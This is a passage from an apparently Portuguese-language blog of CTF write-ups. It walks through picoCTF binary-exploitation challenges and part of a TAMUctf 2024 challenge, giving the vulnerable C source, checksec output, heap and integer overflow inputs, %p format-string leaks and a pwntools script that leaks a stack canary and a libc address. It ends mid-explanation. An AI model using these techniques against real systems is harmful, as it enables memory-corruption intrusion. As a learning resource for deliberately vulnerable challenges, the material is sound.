Please enter a valid choice.\\n\"); //fflush(stdout); // Clear input buffer //while (getchar() != '\\n'); //continue; exit(0); } switch (choice) { case 1: // print heap print_heap(); break; case 2: write_buffer(); break; case 3: // print safe_var printf(\"\\n\\nTake a look at my variable: safe_var = %s\\n\\n\", safe_var); fflush(stdout); break; case 4: // Check for win condition check_win(); break; case 5: // exit return 0; default: printf(\"Invalid choice\\n\"); fflush(stdout); } } } E aqui o checksec:\n1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Para vencer, precisamos fazer com que a comparação if (strcmp(safe_var, \"bico\") != 0) funcione. Isso significa que safe_var precisa ser diferente de \"bico\".\nsafe_var é definido globalmente, mas o usamos na função init() para torná-lo uma string com \"bico\":\n1 2 safe_var = malloc(SAFE_VAR_SIZE); strncpy(safe_var, \"bico\", SAFE_VAR_SIZE); Quando usamos a função write_buffer(), fazemos um scanf de uma string e a inserimos na variável input_data. Se você prestar atenção, input_data e safe_var são alocados com malloc uma após a outra, o que significa que provavelmente também estão localizados sequencialmente (ou bem próximos um do outro) na memória. O print_heap() confirma isso quando o executamos:\n1 2 3 4 5 6 7 8 Heap State: +-------------+----------------+ [*] Address -\u003e Heap Data +-------------+----------------+ [*] 0x55bc1d8756b0 -\u003e pico +-------------+----------------+ [*] 0x55bc1d8756d0 -\u003e bico +-------------+----------------+ pico está no endereço 0x557a2f2bd6b0 e bico está no endereço 0x557a2f2bd6d0. Isso é uma distância de 32 bytes. Se escrevermos em input_data com 32 bytes + algo mais, esse algo mais será escrito na variável safe_var.\nVocê pode escrever a seguinte entrada na função write_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnoop\nDepois disso, você pode verificar usando print_heap() que realmente mudamos safe_var:\n1 2 3 4 5 6 7 8 9 Enter your choice: 1 Heap State: +-------------+----------------+ [*] Address -\u003e Heap Data +-------------+----------------+ [*] 0x55bc1d8756b0 -\u003e AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnoop +-------------+----------------+ [*] 0x55bc1d8756d0 -\u003e noop +-------------+----------------+ Podemos então apenas imprimir a flag.\nflag: picoCTF{my_first_heap_overflow_76775c7c}\nheap 1 No heap 1, temos quase o mesmo código de heap 0. No entanto, a comparação usada para pegar a flag é diferente. Aqui está como é feita em heap 1:\n1 if (!strcmp(safe_var, \"pico\")) A única diferença aqui é que agora queremos que safe_var seja \"pico\".\nNa solução anterior, alteramos safe_var para noop. Podemos usar a mesma solução, mas alterando para \"pico\":\nEntrada para a função write_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico\nflag: picoCTF{starting_to_get_the_hang_e9fbcea5}\nPicker IV Source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 #include #include #include #include void print_segf_message(){ printf(\"Segfault triggered! Exiting.\\n\"); sleep(15); exit(SIGSEGV); } int win() { FILE *fptr; char c; printf(\"You won!\\n\"); // Open file fptr = fopen(\"flag.txt\", \"r\"); if (fptr == NULL) { printf(\"Cannot open file.\\n\"); exit(0); } // Read contents from file c = fgetc(fptr); while (c != EOF) { printf (\"%c\", c); c = fgetc(fptr); } printf(\"\\n\"); fclose(fptr); } int main() { signal(SIGSEGV, print_segf_message); setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered unsigned int val; printf(\"Enter the address in hex to jump to, excluding '0x': \"); scanf(\"%x\", \u0026val); printf(\"You input 0x%x\\n\", val); void (*foo)(void) = (void (*)())val; foo(); } checksec:\n1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Parece que o código solicitará um endereço em hexadecimal e saltará para ele. Como não temos PIE, podemos simplesmente escolher o endereço sem preocupações. Usei o gdb para obter o endereço da função win: 0x40129e.\nO scanf lerá um valor hexadecimal, então fiz o seguinte:\n1 2 3 4 5 nc saturn.picoctf.net 59045 Enter the address in hex to jump to, excluding '0x': 40129e You input 0x40129e You won! picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4} flag: picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}\nbasic-file-exploit O source code é meio longo, mas aqui está ele:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 #include #include #include #include #include #include #include #include #include #define WAIT 60 static const char* flag = \"[REDACTED]\"; static char data[10][100]; static int input_lengths[10]; static int inputs = 0; int tgetinput(char *input, unsigned int l) { fd_set input_set; struct timeval timeout; int ready_for_reading = 0; int read_bytes = 0; if( l \u003c= 0 ) { printf(\"'l' for tgetinput must be greater than 0\\n\"); return -2; } /* Empty the FD Set */ FD_ZERO(\u0026input_set ); /* Listen to the input descriptor */ FD_SET(STDIN_FILENO, \u0026input_set); /* Waiting for some seconds */ timeout.tv_sec = WAIT; // WAIT seconds timeout.tv_usec = 0; // 0 milliseconds /* Listening for input stream for any activity */ ready_for_reading = select(1, \u0026input_set, NULL, NULL, \u0026timeout); /* Here, first parameter is number of FDs in the set, * second is our FD set for reading, * third is the FD set in which any write activity needs to updated, * which is not required in this case. * Fourth is timeout */ if (ready_for_reading == -1) { /* Some error has occured in input */ printf(\"Unable to read your input\\n\"); return -1; } if (ready_for_reading) { read_bytes = read(0, input, l-1); if(input[read_bytes-1]=='\\n'){ --read_bytes; input[read_bytes]='\\0'; } if(read_bytes==0){ printf(\"No data given.\\n\"); return -4; } else { return 0; } } else { printf(\"Timed out waiting for user input. Press Ctrl-C to disconnect\\n\"); return -3; } return 0; } static void data_write() { char input[100]; char len[4]; long length; int r; printf(\"Please enter your data:\\n\"); r = tgetinput(input, 100); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } while (true) { printf(\"Please enter the length of your data:\\n\"); r = tgetinput(len, 4); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } if ((length = strtol(len, NULL, 10)) == 0) { puts(\"Please put in a valid length\"); } else { break; } } if (inputs \u003e 10) { inputs = 0; } strcpy(data[inputs], input); input_lengths[inputs] = length; printf(\"Your entry number is: %d\\n\", inputs + 1); inputs++; } static void data_read() { char entry[4]; long entry_number; char output[100]; int r; memset(output, '\\0', 100); printf(\"Please enter the entry number of your data:\\n\"); r = tgetinput(entry, 4); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } if ((entry_number = strtol(entry, NULL, 10)) == 0) { puts(flag); fseek(stdin, 0, SEEK_END); exit(0); } entry_number--; strncpy(output, data[entry_number], input_lengths[entry_number]); puts(output); } int main(int argc, char** argv) { char input[3] = {'\\0'}; long command; int r; puts(\"Hi, welcome to my echo chamber!\"); puts(\"Type '1' to enter a phrase into our database\"); puts(\"Type '2' to echo a phrase in our database\"); puts(\"Type '3' to exit the program\"); while (true) { r = tgetinput(input, 3); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } if ((command = strtol(input, NULL, 10)) == 0) { puts(\"Please put in a valid number\"); } else if (command == 1) { data_write(); puts(\"Write successful, would you like to do anything else?\"); } else if (command == 2) { if (inputs == 0) { puts(\"No data yet\"); continue; } data_read(); puts(\"Read successful, would you like to do anything else?\"); } else if (command == 3) { return 0; } else { puts(\"Please type either 1, 2 or 3\"); puts(\"Maybe breaking boundaries elsewhere will be helpful\"); } } return 0; } Não recebemos nenhum binário compilado aqui. Podemos, entretanto, compilar nós mesmos para testar as coisas.\nOlhando o source code, precisamos dar trigger nessa condicional:\n1 2 3 4 5 if ((entry_number = strtol(entry, NULL, 10)) == 0) { puts(flag); fseek(stdin, 0, SEEK_END); exit(0); } Para entrar na condicional, é necessário garantir que a conversão da string entry para long integer usando a strtol resulte em 0. Dá para conseguir isso fornecendo um input como 0 ou alguma coisa inválida tipo abc.\nAqui o meu solve:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 nc saturn.picoctf.net 56510 Hi, welcome to my echo chamber! Type '1' to enter a phrase into our database Type '2' to echo a phrase in our database Type '3' to exit the program 1 Please enter your data: nvsuinvfuisj Please enter the length of your data: 10 Your entry number is: 1 Write successful, would you like to do anything else? 2 2 Please enter the entry number of your data: 0 picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942} flag: picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_1B9F5942}\ntwo sum Source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 #include #include static int addIntOvf(int result, int a, int b) { result = a + b; if(a \u003e 0 \u0026\u0026 b \u003e 0 \u0026\u0026 result \u003c 0) return -1; if(a \u003c 0 \u0026\u0026 b \u003c 0 \u0026\u0026 result \u003e 0) return -1; return 0; } int main() { int num1, num2, sum; FILE *flag; char c; printf(\"n1 \u003e n1 + n2 OR n2 \u003e n1 + n2 \\n\"); fflush(stdout); printf(\"What two positive numbers can make this possible: \\n\"); fflush(stdout); if (scanf(\"%d\", \u0026num1) \u0026\u0026 scanf(\"%d\", \u0026num2)) { printf(\"You entered %d and %d\\n\", num1, num2); fflush(stdout); sum = num1 + num2; if (addIntOvf(sum, num1, num2) == 0) { printf(\"No overflow\\n\"); fflush(stdout); exit(0); } else if (addIntOvf(sum, num1, num2) == -1) { printf(\"You have an integer overflow\\n\"); fflush(stdout); } if (num1 \u003e 0 || num2 \u003e 0) { flag = fopen(\"flag.txt\",\"r\"); if(flag == NULL){ printf(\"flag not found: please run this on the server\\n\"); fflush(stdout); exit(0); } char buf[60]; fgets(buf, 59, flag); printf(\"YOUR FLAG IS: %s\\n\", buf); fflush(stdout); exit(0); } } return 0; } Não recebemos nenhum binário compilado.\nPara resolver o problema, precisamos acionar o seguinte código: else if (addIntOvf(sum, num1, num2) == -1) e esse: if (num1 \u003e 0 || num2 \u003e 0) Para que a função addIntOvf retorne -1, precisamos fornecer dois inteiros positivos que resultem em um inteiro negativo (o que indica um overflow). Precisamos escolher dois inteiros positivos devido à segunda condição mencionada.\nint é uma variável de 4 bytes. O tamanho máximo dela é 2147483647 (2^31 - 1). Então se tivermos num1 como 2147483647 e num2 como 1, teremos um integer overflow. Vamos tentar isso:\n1 2 3 4 5 6 7 8 nc saturn.picoctf.net 62116 n1 \u003e n1 + n2 OR n2 \u003e n1 + n2 What two positive numbers can make this possible: 2147483647 1 You entered 2147483647 and 1 You have an integer overflow YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_e06700c0} flag: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_e06700c0}\nformat string 0 Aqui o source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 #include #include #include #include #include #include #define BUFSIZE 32 #define FLAGSIZE 64 char flag[FLAGSIZE]; void sigsegv_handler(int sig) { printf(\"\\n%s\\n\", flag); fflush(stdout); exit(1); } int on_menu(char *burger, char *menu[], int count) { for (int i = 0; i \u003c count; i++) { if (strcmp(burger, menu[i]) == 0) return 1; } return 0; } void serve_patrick(); void serve_bob(); int main(int argc, char **argv){ FILE *f = fopen(\"flag.txt\", \"r\"); if (f == NULL) { printf(\"%s %s\", \"Please create 'flag.txt' in this directory with your\", \"own debugging flag.\\n\"); exit(0); } fgets(flag, FLAGSIZE, f); signal(SIGSEGV, sigsegv_handler); gid_t gid = getegid(); setresgid(gid, gid, gid); serve_patrick(); return 0; } void serve_patrick() { printf(\"%s %s\\n%s\\n%s %s\\n%s\", \"Welcome to our newly-opened burger place Pico 'n Patty!\", \"Can you help the picky customers find their favorite burger?\", \"Here comes the first customer Patrick who wants a giant bite.\", \"Please choose from the following burgers:\", \"Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe\", \"Enter your recommendation: \"); fflush(stdout); char choice1[BUFSIZE]; scanf(\"%s\", choice1); char *menu1[3] = {\"Breakf@st_Burger\", \"Gr%114d_Cheese\", \"Bac0n_D3luxe\"}; if (!on_menu(choice1, menu1, 3)) { printf(\"%s\", \"There is no such burger yet!\\n\"); fflush(stdout); } else { int count = printf(choice1); if (count \u003e 2 * BUFSIZE) { serve_bob(); } else { printf(\"%s\\n%s\\n\", \"Patrick is still hungry!\", \"Try to serve him something of larger size!\"); fflush(stdout); } } } void serve_bob() { printf(\"\\n%s %s\\n%s %s\\n%s %s\\n%s\", \"Good job! Patrick is happy!\", \"Now can you serve the second customer?\", \"Sponge Bob wants something outrageous that would break the shop\", \"(better be served quick before the shop owner kicks you out!)\", \"Please choose from the following burgers:\", \"Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak\", \"Enter your recommendation: \"); fflush(stdout); char choice2[BUFSIZE]; scanf(\"%s\", choice2); char *menu2[3] = {\"Pe%to_Portobello\", \"$outhwest_Burger\", \"Cla%sic_Che%s%steak\"}; if (!on_menu(choice2, menu2, 3)) { printf(\"%s\", \"There is no such burger yet!\\n\"); fflush(stdout); } else { printf(choice2); fflush(stdout); } } Checksec:\n1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Para acionar a impressão da flag, você precisa explorar uma vulnerabilidade de format string. Aqui está o processo:\nAo iniciar o programa, você entra na função serve_patrick(). Para continuar para a função serve_bob(), a opção disponível é Gr%114d_Cheese.\nQuando você chega em serve_bob(), há um menu semelhante, e qualquer seleção será impressa usando printf. Isso cria uma vulnerabilidade de format string. Escolher a opção Pe%to_Portobello resulta em:\n1 2 Enter your recommendation: Pe%to_Portobello Pe20021560_Portobello Isso indica que a entrada está sendo usada como formato pelo printf, e números são lidos da memória.\nE se escolhermos a opção Cla%sic_Che%s%steak?\n1 2 3 4 Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak Enter your recommendation: Cla%sic_Che%s%steak ClaCla%sic_Che%s%steakic_Che(null) picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6} O que aconteceu foi que o %s na entrada tenta imprimir strings armazenadas em endereços de memória. Como printf não tem argumentos para %s, ele usa argumentos da memória, levando a um erro de segmentação (segfault) e revelando a flag.\nflag: picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}\nformat string 1 Source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #include int main() { char buf[1024]; char secret1[64]; char flag[64]; char secret2[64]; // Read in first secret menu item FILE *fd = fopen(\"secret-menu-item-1.txt\", \"r\"); if (fd == NULL){ printf(\"'secret-menu-item-1.txt' file not found, aborting.\\n\"); return 1; } fgets(secret1, 64, fd); // Read in the flag fd = fopen(\"flag.txt\", \"r\"); if (fd == NULL){ printf(\"'flag.txt' file not found, aborting.\\n\"); return 1; } fgets(flag, 64, fd); // Read in second secret menu item fd = fopen(\"secret-menu-item-2.txt\", \"r\"); if (fd == NULL){ printf(\"'secret-menu-item-2.txt' file not found, aborting.\\n\"); return 1; } fgets(secret2, 64, fd); printf(\"Give me your order and I'll read it back to you:\\n\"); fflush(stdout); scanf(\"%1024s\", buf); printf(\"Here's your order: \"); printf(buf); printf(\"\\n\"); fflush(stdout); printf(\"Bye!\\n\"); fflush(stdout); return 0; } Checksec:\n1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Temos uma vulnerabilidade de format string aqui:\n1 2 3 scanf(\"%1024s\", buf); printf(\"Here's your order: \"); printf(buf); Controlamos o que é fornecido para a função printf. Como não sabemos o tamanho de secret-menu-item-1.txt ou secret-menu-item-2.txt, pode ficar meio difícil saber em qual lugar da memória a string em flag.txtestá. Então eu decidi simplesmente colocar um monte de %pe ver o que eu consigo:\n1 2 3 Give me your order and I'll read it back to you: %p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p, Here's your order: 0x402118,(nil),0x760c1fa2da00,(nil),0x11a1880,0xa347834,0x7ffcaa973f50,0x760c1f81ee60,0x760c1fa434d0,0x1,0x7ffcaa974020,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x30355f673431665f,0x7d343663363933,0x7,0x760c1fa458d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x760c1fa56de9,0x760c1f827098,0x760c1fa434d0,(nil),0x7ffcaa974030,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c, A partir do pointer 14, temos uma string. Podemos ver o que ela é fazendo:\n1 2 \u003e\u003e\u003e int.to_bytes(0x7b4654436f636970, 8, 'little') b'picoCTF{' Se fizermos o mesmo com os próximos valores, conseguimos a flag.\nflag: picoCTF{4n1m41_57y13_4x4_f14g_50396c64}\nStonks Source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 #include #include #include #include #define FLAG_BUFFER 128 #define MAX_SYM_LEN 4 typedef struct Stonks { int shares; char symbol[MAX_SYM_LEN + 1]; struct Stonks *next; } Stonk; typedef struct Portfolios { int money; Stonk *head; } Portfolio; int view_portfolio(Portfolio *p) { if (!p) { return 1; } printf(\"\\nPortfolio as of \"); fflush(stdout); system(\"date\"); // TODO: implement this in C fflush(stdout); printf(\"\\n\\n\"); Stonk *head = p-\u003ehead; if (!head) { printf(\"You don't own any stonks!\\n\"); } while (head) { printf(\"%d shares of %s\\n\", head-\u003eshares, head-\u003esymbol); head = head-\u003enext; } return 0; } Stonk *pick_symbol_with_AI(int shares) { if (shares \u003c 1) { return NULL; } Stonk *stonk = malloc(sizeof(Stonk)); stonk-\u003eshares = shares; int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1; for (int i = 0; i \u003c= MAX_SYM_LEN; i++) { if (i \u003c AI_symbol_len) { stonk-\u003esymbol[i] = 'A' + (rand() % 26); } else { stonk-\u003esymbol[i] = '\\0'; } } stonk-\u003enext = NULL; return stonk; } int buy_stonks(Portfolio *p) { if (!p) { return 1; } char api_buf[FLAG_BUFFER]; FILE *f = fopen(\"api\",\"r\"); if (!f) { printf(\"Flag file not found. Contact an admin.\\n\"); exit(1); } fgets(api_buf, FLAG_BUFFER, f); int money = p-\u003emoney; int shares = 0; Stonk *temp = NULL; printf(\"Using patented AI algorithms to buy stonks\\n\"); while (money \u003e 0) { shares = (rand() % money) + 1; temp = pick_symbol_with_AI(shares); temp-\u003enext = p-\u003ehead; p-\u003ehead = temp; money -= shares; } printf(\"Stonks chosen\\n\"); // TODO: Figure out how to read token from file, for now just ask char *user_buf = malloc(300 + 1); printf(\"What is your API token?\\n\"); scanf(\"%300s\", user_buf); printf(\"Buying stonks with token:\\n\"); printf(user_buf); // TODO: Actually use key to interact with API view_portfolio(p); return 0; } Portfolio *initialize_portfolio() { Portfolio *p = malloc(sizeof(Portfolio)); p-\u003emoney = (rand() % 2018) + 1; p-\u003ehead = NULL; return p; } void free_portfolio(Portfolio *p) { Stonk *current = p-\u003ehead; Stonk *next = NULL; while (current) { next = current-\u003enext; free(current); current = next; } free(p); } int main(int argc, char *argv[]) { setbuf(stdout, NULL); srand(time(NULL)); Portfolio *p = initialize_portfolio(); if (!p) { printf(\"Memory failure\\n\"); exit(1); } int resp = 0; printf(\"Welcome back to the trading app!\\n\\n\"); printf(\"What would you like to do?\\n\"); printf(\"1) Buy some stonks!\\n\"); printf(\"2) View my portfolio\\n\"); scanf(\"%d\", \u0026resp); if (resp == 1) { buy_stonks(p); } else if (resp == 2) { view_portfolio(p); } free_portfolio(p); printf(\"Goodbye!\\n\"); exit(0); } Não recebemos nenhum arquivo binário compilado no chall.\nNesse chall, temos outra vulnerabilidade de format string. Dê uma olhada nessas linhas da função buy_stonks:\n1 2 3 4 5 char *user_buf = malloc(300 + 1); printf(\"What is your API token?\\n\"); scanf(\"%300s\", user_buf); printf(\"Buying stonks with token:\\n\"); printf(user_buf); Precisamos saber onde o conteúdo de api está. Eu coloquei um monte de %p novamente porque parecia ser a forma mais simples de resolver:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 nc mercury.picoctf.net 27912 Welcome back to the trading app! What would you like to do? 1) Buy some stonks! 2) View my portfolio 1 Using patented AI algorithms to buy stonks Stonks chosen What is your API token? %p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p, Buying stonks with token: 0x8a3b450,0x804b000,0x80489c3,0xf7f60d80,0xffffffff,0x1,0x8a39160,0xf7f6e110,0xf7f60dc7,(nil),0x8a3a180,0x1,0x8a3b430,0x8a3b450,0x6f636970,0x7b465443,0x306c5f49,0x345f7435,0x6d5f6c6c,0x306d5f79,0x5f79336e,0x32666331,0x30613130,0xffda007d,0xf7f9baf8,0xf7f6e440,0xf8bb5a00,0x1,(nil),0xf7dfdce9, Portfolio as of Fri Aug 2 05:05:33 UTC 2024 1 shares of SXD 1 shares of NJF 1 shares of CN 4 shares of HXQ 3 shares of UR 81 shares of ONKL 188 shares of F 451 shares of G 327 shares of ANLB 175 shares of U 189 shares of K Goodbye! Criei um script em python para olhar para o output e gerar uma solução:\n1 2 3 4 5 6 7 8 9 10 11 output = '0x8a3b450,0x804b000,0x80489c3,0xf7f60d80,0xffffffff,0x1,0x8a39160,0xf7f6e110,0xf7f60dc7,(nil),0x8a3a180,0x1,0x8a3b430,0x8a3b450,0x6f636970,0x7b465443,0x306c5f49,0x345f7435,0x6d5f6c6c,0x306d5f79,0x5f79336e,0x32666331,0x30613130,0xffda007d,0xf7f9baf8,0xf7f6e440,0xf8bb5a00,0x1,(nil),0xf7dfdce9' output = output.split(',') decoded = '' for _ in range(len(output)): output[_] = output[_].encode() try: decoded += int.to_bytes(int(output[_], 16), 8, 'big').decode()[::-1] except (UnicodeDecodeError, ValueError): continue print(decoded) flag: picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}\nChallenge extra ^^ TAMUctf 2024 - admin panel DISCLAIMER: Eu não resolvi esse challenge durante o CTF.\nVamos começar :)\nO desafio nos fornece um arquivo zip. Ao descompactá-lo, obtemos uma libc, um arquivo ld, um arquivo executável e um arquivo de código fonte. Vamos dar uma olhada no código fonte:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 #include #include int upkeep() { // IGNORE THIS setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0); } int admin() { int choice = 0; char report[64]; puts(\"\\nWelcome to the administrator panel!\\n\"); puts(\"Here are your options:\"); puts(\"1. Display current status report\"); puts(\"2. Submit error report\"); puts(\"3: Perform cloning (currently disabled)\\n\"); puts(\"Enter either 1, 2 or 3: \"); scanf(\"%d\", \u0026choice); printf(\"You picked: %d\\n\\n\", choice); if (choice==1) { puts(\"Status report: \\n\"); puts(\"\\tAdministrator panel functioning as expected.\"); puts(\"\\tSome people have told me that my code is insecure, but\"); puts(\"\\tfortunately, the panel has many standard security measures implemented\"); puts(\"\\tto make up for that fact.\\n\"); puts(\"\\tCurrently working on implementing cloning functionality,\"); puts(\"\\tthough it may be somewhat difficult (I am not a competent programmer).\"); } else if (choice==2) { puts(\"Enter information on what went wrong:\"); scanf(\"%128s\", report); puts(\"Report submitted!\"); } else if (choice==3) { // NOTE: Too dangerous in the wrong hands, very spooky indeed puts(\"Sorry, this functionality has not been thoroughly tested yet! Try again later.\"); return 0; clone(); } else { puts(\"Invalid option!\"); } } int main() { upkeep(); char username[16]; char password[24]; char status[24] = \"Login Successful!\\n\"; puts(\"Secure Login:\"); puts(\"Enter username of length 16:\"); scanf(\"%16s\", username); puts(\"Enter password of length 24:\"); scanf(\"%44s\", password); printf(\"Username entered: %s\\n\", username); if (strncmp(username, \"admin\", 5) != 0 || strncmp(password, \"secretpass123\", 13) != 0) { strcpy(status, \"Login failed!\\n\"); printf(status); printf(\"\\nAccess denied to admin panel.\\n\"); printf(\"Exiting...\\n\"); return 0; } printf(status); admin(); printf(\"\\nExiting...\\n\"); } Checksec do binário fornecido:\n1 2 3 4 5 Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Tudo está habilitado !\nEu usei o pwninit para gerar um arquivo patcheado que usa a libc e o ld fornecidos. Você pode conferi-lo aqui: pwninit\nAo olhar o código-fonte, há algumas coisas suspeitas…\npassword é um buffer de tamanho 24, mas estamos escrevendo 45 bytes nele (scanf(\"%44s\", password);). Existem dois printf(status);, o que pode se tornar uma vulnerabilidade de format string. report é um buffer de tamanho 64, mas estamos escrevendo 129 bytes nele (scanf(\"%128s\", report);). Para executar a função admin, precisamos de um username com admin e uma password com secretpass123. Então, para o username, eu forneci a entrada admin. Mas o password é um buffer de tamanho 24 e podemos escrever mais coisas nele. Na verdade, podemos sobrescrever o conteúdo de status, que é declarado imediatamente após password!\nComo status é usado dentro do printf, na verdade temos uma vulnerabilidade de format string. Precisamos preencher o buffer password + o espaço entre password e status e então começar a escrever em status.\nPara calcular o índice passado na format string, podemos usar o gdb. Vamos inserir um ponto de interrupção logo antes do printf vulnerável e examinar a pilha:\nO stack cookie (logo antes do rbp) está na posição 10 se começarmos a contar do topo da pilha. O printf começará imprimindo os registradores e depois imprimirá a pilha. Isso significa que precisamos adicionar 5 a essa contagem (resultando em 15). É importante saber o stack cookie, pois temos um buffer overflow dentro da função admin.\nÉ importante notar também que temos ASLR e PIE ativados, então seria bom ter um vazamento de endereço. Felizmente, ainda podemos escrever mais coisas na entrada do password. Vamos olhar novamente a pilha e ver se conseguimos vazar algo:\nHá um endereço logo após o rbp. É um endereço de retorno para algum lugar. Vamos descobrir para onde isso nos leva executando o comando vmmap.\nNosso endereço é 0x00007ffff7e3109b, e como podemos ver, isso está dentro da libc. Então, podemos vazar um endereço da libc. Como a posição do stack cookie é 15 e está 2 posições antes do endereço de retorno, a posição do endereço da libc será 17 quando explorarmos a vulnerabilidade da format string.\nAté agora temos:\n1 2 3 4 5 6 7 p = process(\"./admin-panel_patched\") p.recvline() p.recvline() p.sendline(b\"admin\") p.recvline() p.sendline(b'secretpass123aaaaaaaaaaaaaaaaaaa%15$p,%17$p') p.recvline() Isso deve imprimir o stack cookie e o endereço da libc. Vamos pegar esses valores e imprimi-los na solução:\n1 2 3 4 5 leak_addr = p.recvline().decode()[:-1].split(',') stack_cookie = int(leak_addr[0], 16) libc_leak = int(leak_addr[1], 16) print(f\"stack cookie is: {hex(stack_cookie)}\") print(f\"leaked address is: {hex(libc_leak)}\") Ótimo! O stack cookie e o endereço vazado estão salvos. O programa está agora dentro da função admin(). Vamos tentar explorar o estouro de buffer escolhendo a opção 2. Há uma escrita de 129 bytes no buffer de 64 